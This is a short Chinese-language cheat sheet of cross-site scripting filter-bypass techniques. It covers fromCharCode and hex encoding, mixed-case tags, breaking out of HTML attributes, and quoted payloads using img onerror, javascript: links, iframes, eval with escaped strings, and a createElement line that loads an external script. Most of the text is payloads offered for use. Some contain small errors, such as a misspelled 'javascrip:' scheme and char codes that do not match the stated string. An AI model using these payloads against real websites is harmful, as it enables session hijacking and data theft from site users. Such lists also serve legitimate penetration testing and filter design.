几种常用的绕过方式

1.绕过 magic_quotest_gpc

  magic_quotes_gpc = ON 是php安全设置，开启后会把特殊字符进行转义比如 单引号' 会变成 \' ，这样特殊符号就变成了普通字符
 
  使用javascript String对象中的fromCharCode方法来绕过，比如可以把 alert("xss")转换成
  
  String.fromCharCode(97,108,101,114,116,40,34,88,83,34,41) 然后外部包上一层script标签也是等效的，不放心可以加eval()函数

  另外上面的数字其实就是ASCII码，可以使用火狐自带的hackbar来自动生成



2.HEX编码

   可以将字符串装换成十六进制，比如 <script>alert("x")</script> 转换之后就是：
  
   %3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%22%29%3c%2f%73%63%72%69%70%74%3e

   这里可以使用自制工具 string2hexcode 来实现

  
3.改变大小写

   可以通过大小写混合来绕过那些对大小写敏感的防火墙如 <script>alert("xss");</script> 准换成：
 
   <ScRipt>AlerT("x");</sCrIpT>
   
   
4.关闭标签
  
   可以通过审阅源码来发现参数显示在html页面中对应的标签，比如  <div userid="38" ></div>

   假如38是存在xss漏洞的， 那么植入的xss代码就可以为  "><script>alert("xss")</script><div>



来自freebuf的Black-hole文章：

  如果过滤或者禁止提交script时：

    利用图片加载错误执行脚本：	<img src=1 onerror=alert('xss') />
    利用跳转内容执行脚本：	<a href=javascrip:alert('xss')>s</a>
    使用框架来执行脚本：	<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>
    使用eval绕过：		<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")>
    创建元素：			<img src=x onerror=appendChild(createElement('script')).src='js_url' />
   